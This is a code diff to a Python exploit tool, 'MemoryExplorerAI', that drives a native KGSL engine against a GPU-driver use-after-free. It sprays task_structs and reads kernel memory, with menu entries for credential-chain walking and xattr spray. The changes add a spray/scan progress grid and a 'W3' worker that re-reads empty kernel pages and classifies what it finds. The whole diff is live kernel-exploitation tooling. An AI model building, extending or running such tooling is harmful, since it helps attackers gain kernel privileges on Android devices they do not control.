@@ -158,6 +158,32 @@ class MemoryExplorerAI:
             "ranges_tried": [],
         }
 
+        # === SPRAY MAP / SCAN MAP ===
+        # Visual 2D map of the address space. We split the 32MB
+        # UAF range into 64 buckets of 512KB each and track the
+        # state of each bucket:
+        #   0 = unscanned, gray
+        #   1 = spraying now, yellow
+        #   2 = spray error, red
+        #   3 = scanning now, orange
+        #   4 = scan error, dark orange
+        #   5 = fully done, blue/gray
+        #   6 = FOUND (non-zero data), green
+        # The map is rendered in the TUI as a 8x8 grid so the
+        # user can see at a glance which areas we've covered.
+        self.SPRAY_MAP_BUCKETS = 64  # 8x8 grid
+        self.SPRAY_MAP_BUCKET_SIZE = 0x2000000 // self.SPRAY_MAP_BUCKETS
+        self.spray_map = [0] * self.SPRAY_MAP_BUCKETS
+
+        # === W3 (deep-scan worker) ===
+        # Dedicated 4th worker that re-scans Empty Page locations
+        # to verify they're really empty. The user reported that
+        # the 3 Empty Page addresses (0xffffffc000000000 etc.) are
+        # "where the spray should be" — W3 keeps poking at them
+        # to see if anything new appears.
+        self.w3_thread = None
+        self.w3_enabled = False
+
         base_dir = os.path.dirname(os.path.abspath(__file__))
         self.engine_path = os.path.join(base_dir, "kgsl_engine")
 
@@ -995,7 +1021,7 @@ class MemoryExplorerAI:
         # three are alive (and their individual spray counts). Before
         # this, the TUI just showed "1/3 workers" as a single number
         # and there was no way to tell which worker had died.
-        if self._learn_subworkers:
+        if self._learn_subworkers or self.w3_enabled:
             worker_parts = []
             for wid in range(LEARN_WORKERS):
                 t = self._learn_subworkers[wid] if wid < len(self._learn_subworkers) else None
@@ -1004,9 +1030,17 @@ class MemoryExplorerAI:
                 state = f"{C.GRN}●{C.RST}" if alive else f"{C.RED}●{C.RST}"
                 worker_parts.append(
                     f"W{wid}{state}{len(pids)}")
+            # W3 deep-scan worker (4th worker, no spray, just
+            # re-scans Empty Page locations to see if anything
+            # appeared there since the original scan).
+            w3_alive = (self.w3_thread
+                        and self.w3_thread.is_alive()
+                        and self.w3_enabled)
+            w3_state = f"{C.GRN}●{C.RST}" if w3_alive else f"{C.GRY}○{C.RST}"
+            worker_parts.append(f"W3{w3_state}D")
             out.append(f" {C.BOLD}WORKERS{C.RST}: "
                    f"{' '.join(worker_parts)}  "
-                   f"{C.GRY}(●=alive n=spray procs){C.RST}  "
+                   f"{C.GRY}(●=alive n=spray procs, W3=deep-scan){C.RST}  "
                    f"{C.GRY}adapt={self._adaptive_scan.get('offset_idx', 0)}"
                    f"/{self._adaptive_scan.get('no_match_batches', 0)}nm{C.RST}")
         # kbase coloring — use a different color when we don't know it
@@ -1085,6 +1119,56 @@ class MemoryExplorerAI:
                            f"{C.DIM}(found items, 64-bit kernel VA){C.RST}")
                 for ln in lines_to_show:
                     out.append(ln)
+                out.append(f"{C.GRY}{'─'*92}{C.RST}")
+
+            # === SPRAY MAP (8x8 grid of UAF address space) ===
+            # Each cell represents a 512KB bucket of the UAF range.
+            # Color codes (legend below):
+            #   ░ = unscanned       (gray)
+            #   ▒ = spraying now    (yellow)
+            #   █ = spray error     (red)
+            #   ▓ = scanning now    (orange)
+            #   ◆ = scan error      (dark orange / magenta)
+            #   · = done (empty)    (blue/gray)
+            #   ★ = FOUND!          (green)
+            sm = self.spray_map
+            if any(sm):  # only show if there's something
+                out.append(f" {C.BOLD}{C.CYN}[SPRAY MAP]{C.RST} "
+                           f"{C.DIM}(8×8 grid of 32MB UAF, 512KB/bucket){C.RST}")
+                grid_chars = {
+                    0: (f"{C.GRY}░",  "unscanned"),
+                    1: (f"{C.YEL}▒",  "spraying"),
+                    2: (f"{C.RED}█",  "spray err"),
+                    3: (f"{C.MAG}▓",  "scanning"),
+                    4: (f"{C.RED}◆",  "scan err"),
+                    5: (f"{C.BLU}·",  "done-empty"),
+                    6: (f"{C.GRN}★",  "FOUND!"),
+                }
+                # Render as 8 rows of 8 cells, with a VA annotation
+                # for the first column of each row.
+                for row in range(8):
+                    cells = []
+                    for col in range(8):
+                        bidx = row * 8 + col
+                        if bidx < len(sm):
+                            ch, _ = grid_chars.get(
+                                sm[bidx], (f"{C.GRY}░", "unscanned"))
+                            cells.append(ch)
+                        else:
+                            cells.append(f"{C.GRY}░")
+                    # First cell of each row shows the VA offset
+                    va_off = row * 8 * self.SPRAY_MAP_BUCKET_SIZE
+                    va_str = f"0x{va_off:07x}"
+                    out.append(
+                        f"   {C.DIM}{va_str}{C.RST}  "
+                        f"{''.join(cells)}{C.RST}")
+                # Legend
+                legend_parts = []
+                for code, (ch, name) in grid_chars.items():
+                    if any(c == code for c in sm):
+                        legend_parts.append(f"{ch}{C.RST}={name}")
+                out.append(f"   {C.GRY}legend: "
+                           f"{' '.join(legend_parts)}{C.RST}")
                 out.append(f"{C.GRY}{'─'*92}{C.RST}")
         out.append(f" {C.BOLD}{C.WHT}[FILE MANAGER VIEW] — Found Memory Offsets  "
                    f"{C.GRY}({len(self.found_items)} total){C.RST}")
@@ -1176,7 +1260,7 @@ class MemoryExplorerAI:
         out.append(
             f" {C.BLU}[v<N>]{C.RST} Re-verify    "
             f" {C.BLU}[walk]{C.RST} Cred chain   "
-            f" {C.BLU}[xt]{C.RST} xattr spray"
+            f" {C.BLU}[w3]{C.RST} Deep-scan"
         )
         out.append(f"{C.GRY}{'─'*92}{C.RST}")
 
@@ -2666,6 +2750,129 @@ class MemoryExplorerAI:
             pass
         self.log_event("learning_done", self.learn_stats)
 
+    def _w3_worker(self):
+        """W3 — dedicated deep-scan worker for Empty Page locations.
+
+        Unlike the 3 spray workers (W0, W1, W2) which spray+scan
+        their own slice, W3 ONLY scans. It re-reads the addresses
+        of any item with type "Empty Page" or any other "boring"
+        type to see if they change (spray might have landed later,
+        or another worker might have written to that page).
+        Updates the spray_map as it goes so the TUI shows the
+        bucket as "scanning" (orange) or "found" (green).
+        """
+        import time as _t
+        while not self.cancel_flag.is_set() and self.w3_enabled:
+            if not self.ensure_engine():
+                _t.sleep(1.0)
+                continue
+            # Pick up to 4 targets this iteration:
+            # 1) All Empty Page items
+            # 2) First 2 from found_items (in case new ones appeared)
+            targets = []
+            for it in list(self.found_items):
+                if it.get("type") == "Empty Page":
+                    try:
+                        targets.append(int(it["va"], 16))
+                    except Exception:
+                        pass
+            # Sort by VA for stable re-checks
+            targets = sorted(set(targets))[:4]
+            if not targets:
+                # Nothing to deep-scan right now. Sleep and try
+                # again in 5s.
+                _t.sleep(5.0)
+                continue
+            for va in targets:
+                if self.cancel_flag.is_set() or not self.w3_enabled:
+                    break
+                # Compute bucket index
+                if (va >= self.uaf_start
+                    and va < self.uaf_start + self.scan_size):
+                    bidx = (va - self.uaf_start) // self.SPRAY_MAP_BUCKET_SIZE
+                    if 0 <= bidx < self.SPRAY_MAP_BUCKETS:
+                        with self.stats_lock:
+                            self.spray_map[bidx] = 3  # scanning
+                # Read 4 consecutive pages around this VA
+                with self.stats_lock:
+                    self.live["last_msg"] = (
+                        f"W3: deep-scan 0x{va:x} (Empty Page recheck)")
+                found_here = False
+                for off in (0, 0x1000, -0x1000, 0x2000):
+                    target_va = va + off
+                    if (target_va < self.uaf_start
+                        or target_va >= self.uaf_start + self.scan_size):
+                        continue
+                    if not self._engine_write(
+                            f"read {hex(target_va)}\n".encode()):
+                        continue
+                    data = self._read_data_packet()
+                    if not data or len(data) < 4096:
+                        # Scan error
+                        if (target_va >= self.uaf_start
+                            and target_va < self.uaf_start + self.scan_size):
+                            bidx = ((target_va - self.uaf_start)
+                                    // self.SPRAY_MAP_BUCKET_SIZE)
+                            if 0 <= bidx < self.SPRAY_MAP_BUCKETS:
+                                with self.stats_lock:
+                                    self.spray_map[bidx] = 4
+                        continue
+                    # Count non-zero bytes
+                    nz = sum(1 for b in data if b)
+                    if nz > 16:
+                        # Non-trivial data — update bucket to FOUND
+                        if (target_va >= self.uaf_start
+                            and target_va < self.uaf_start + self.scan_size):
+                            bidx = ((target_va - self.uaf_start)
+                                    // self.SPRAY_MAP_BUCKET_SIZE)
+                            if 0 <= bidx < self.SPRAY_MAP_BUCKETS:
+                                with self.stats_lock:
+                                    self.spray_map[bidx] = 6  # found!
+                        # Try to classify it now (it might be a real
+                        # object that we missed the first time)
+                        classified = self.classify_page(
+                            target_va, data, 17)  # sig=17 = comm-like
+                        if classified and classified.get("type") != "Empty Page":
+                            with self.bg_lock:
+                                if not any(int(it['va'], 16) == target_va
+                                           for it in self.found_items):
+                                    self.found_items.append(classified)
+                            with self.stats_lock:
+                                self.learn_stats["matches"] += 1
+                            found_here = True
+                            with self.stats_lock:
+                                self.live["last_msg"] = (
+                                    f"W3: FOUND 0x{target_va:x} = "
+                                    f"{classified.get('type')} "
+                                    f"({classified.get('description')})")
+                            break
+                    else:
+                        # Still empty
+                        if (target_va >= self.uaf_start
+                            and target_va < self.uaf_start + self.scan_size):
+                            bidx = ((target_va - self.uaf_start)
+                                    // self.SPRAY_MAP_BUCKET_SIZE)
+                            if 0 <= bidx < self.SPRAY_MAP_BUCKETS:
+                                with self.stats_lock:
+                                    self.spray_map[bidx] = 5  # done
+                _t.sleep(0.5)  # be nice to the engine
+            _t.sleep(2.0)
+
+    def cmd_w3_toggle(self):
+        """Toggle the W3 deep-scan worker."""
+        if self.w3_enabled:
+            self.w3_enabled = False
+            if self.w3_thread:
+                self.w3_thread.join(timeout=2.0)
+            self.live["last_msg"] = "W3 worker STOPPED"
+        else:
+            self.w3_enabled = True
+            self.w3_thread = threading.Thread(
+                target=self._w3_worker, daemon=True)
+            self.w3_thread.start()
+            self.live["last_msg"] = (
+                "W3 worker STARTED (deep-scan Empty Pages)")
+
     def _learning_subworker(self, worker_id, slice_start, slice_end):
         """One parallel slice of the AI learning loop. Runs in its own thread.
 
@@ -2803,6 +3010,22 @@ class MemoryExplorerAI:
             with self.stats_lock:
                 self.live["spray_count"] += len(batch_pids)
                 self.learn_stats["batches"] += 1
+                # Update spray_map: mark the bucket for this
+                # worker's slice as "spraying" (1) so the TUI
+                # grid lights up. After the batch is scanned, the
+                # bucket transitions to scanning (3) then done.
+                sm = self.spray_map
+                kb_chunk = 0x2000000 // LEARN_WORKERS
+                slice_offset = (worker_id * kb_chunk)
+                if 0 <= slice_offset < 0x2000000:
+                    bidx = slice_offset // self.SPRAY_MAP_BUCKET_SIZE
+                    if 0 <= bidx < len(sm):
+                        # 1 = spraying, or 2 if previous batch
+                        # had spray errors. Detect spray errors:
+                        if len(batch_pids) < 5:  # most died
+                            sm[bidx] = 2
+                        else:
+                            sm[bidx] = 1
             # Let the kernel actually publish the task_structs into
             # KGSL page-tables before we scan. Without this delay, the
             # scanner reads pages that don't yet contain any of our
@@ -2914,6 +3137,14 @@ class MemoryExplorerAI:
             with self.stats_lock:
                 self.live["scan_total"]   = s_end - s_start
                 self.live["scan_offset"]  = s_start
+                # Mark this bucket as "scanning" (3) in the spray_map
+                if 0 <= (s_start - self.uaf_start) < self.scan_size:
+                    bidx = (s_start - self.uaf_start) // self.SPRAY_MAP_BUCKET_SIZE
+                    if 0 <= bidx < len(self.spray_map):
+                        # Only mark as scanning if it was 0/1/2/5,
+                        # not if it was already FOUND (6).
+                        if self.spray_map[bidx] != 6:
+                            self.spray_map[bidx] = 3
 
             if not self._engine_write(
                     f"scan {hex(s_start)} {hex(s_end)}\n".encode()):
@@ -2924,6 +3155,11 @@ class MemoryExplorerAI:
                 # for the rest of the learning run.
                 with self.stats_lock:
                     self.live["engine_pid"] = 0
+                    # Mark bucket as scan error (4) — dark orange/magenta
+                    if 0 <= (s_start - self.uaf_start) < self.scan_size:
+                        bidx = (s_start - self.uaf_start) // self.SPRAY_MAP_BUCKET_SIZE
+                        if 0 <= bidx < len(self.spray_map):
+                            self.spray_map[bidx] = 4
                 time.sleep(0.5)
                 continue
 
@@ -3670,6 +3906,12 @@ class MemoryExplorerAI:
             # Also start learning right away
             if not (self.bg_thread and self.bg_thread.is_alive()):
                 self.cmd_learning_start()
+            # Auto-start W3 deep-scan worker (the 4th worker
+            # that re-scans Empty Page locations the user
+            # specifically asked for). Without this the user
+            # has to press 'w3' manually to start it.
+            if not self.w3_enabled:
+                self.cmd_w3_toggle()
 
         # === WATCHDOG THREAD ===
         # Without this, if autopilot or learning crashes (e.g. SIGSYS
@@ -3963,6 +4205,10 @@ class MemoryExplorerAI:
                 self.live["last_msg"] = (
                     f"setxattr spray: {state}. "
                     f"{'Next spray will add xattr per process.' if self.use_xattr_spray else 'Using only task_struct comm spray.'}")
+            elif cmd in ("w3", "deep", "w3toggle"):
+                # Toggle W3 deep-scan worker. The 4th dedicated
+                # worker that re-scans Empty Page locations.
+                self.cmd_w3_toggle()
             elif cmd in ("stats", "stat"):
                 # Detailed learning statistics
                 try:
